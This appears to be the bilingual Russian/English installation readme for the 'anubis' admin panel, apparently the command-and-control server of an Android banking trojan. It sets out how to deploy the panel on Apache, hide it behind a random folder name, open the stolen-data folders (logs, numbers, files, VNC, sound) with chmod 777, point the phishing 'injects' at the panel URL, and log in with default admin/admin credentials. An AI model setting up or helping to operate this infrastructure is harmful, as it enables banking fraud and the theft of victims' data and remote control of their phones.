
Linux Centos, Debian, Ubuntu, php 7 + mysql не ниже 5.5

***************************************

---Русский---

1) Распаковать админ панель в корневом каталоге сервера Apache(/var/www/html/);

2) Загрузить базу данных на сервер mysql;

3) Изменить имя папки "anubis", к примеру "asdfgh35546fhwJYGvdfgsadsg";

4) Прописываем конфигурации подключения к базе данных, 
	/private/config.php, 
	/asdfgh35546fhwJYGvdfgsadsg/config.php, 
там же указываем в config.php нашу папку:
	"define('namefolder', 'asdfgh35546fhwJYGvdfgsadsg');";

5) Открываем доступ к папкам:
	chmod 777 asdfgh35546fhwJYGvdfgsadsg/application/datalogs/logs
	chmod 777 asdfgh35546fhwJYGvdfgsadsg/application/datalogs/numers
	chmod 777 asdfgh35546fhwJYGvdfgsadsg/application/datalogs/files
	chmod 777 asdfgh35546fhwJYGvdfgsadsg/application/websocket/VNC
	chmod 777 asdfgh35546fhwJYGvdfgsadsg/application/websocket/sound

6)Указываем URL админ панели инжектам, так же инжекты можно размещать отдельно от админ панели! 
	/inj/config.php 

	$URL= "http://URL_ADMIN_PANEL.COM";

7) Переименовываем файл dd.htaccess на .htaccess

8) Открываем url: http://URL_ADMIN_PANEL.COM/asdfgh35546fhwJYGvdfgsadsg
	Login: admin
	Password: admin
 


***************************************



---English---

Server debian 8 + php7.2 + mysql server + phpmyadmin

1) Unpack the admin panel in the root directory of the Apache server(/var/www/html/);

2) Upload database to mysql server;

3) Change the folder name "anubis", for example "asdfgh35546fhwJYGvdfgsadsg";

4) Prescribe the configuration of the database connection,
	/private/config.php,
	/asdfgh35546fhwJYGvdfgsadsg/config.php,
there's also specified in the config.php our folder:
	"define ('namefolder', 'asdfgh35546fhwJYGvdfgsadsg');";

5) Open access to folders:
	chmod 777 asdfgh35546fhwJYGvdfgsadsg/application/data logs/logs
	chmod 777 asdfgh35546fhwJYGvdfgsadsg/application/data logs/numbers
	chmod 777 asdfgh35546fhwJYGvdfgsadsg/application/data logs/files
	chmod 777 asdfgh35546fhwJYGvdfgsadsg/application/websocket/VNC
	chmod 777 asdfgh35546fhwJYGvdfgsadsg/application/websocket/sound

6) Specify URL admin panel injection, as the injectors can be installed separately from the injectors admin panel!
	/inj/config.php 
	
		$URL= "http://URL_ADMIN_PANEL.COM";
		
7) Edit file name  dd.htaccess to .htaccess

8) Open url: http://URL_ADMIN_PANEL.COM/asdfgh35546fhwJYGvdfgsadsg
	Login: admin
	Password: admin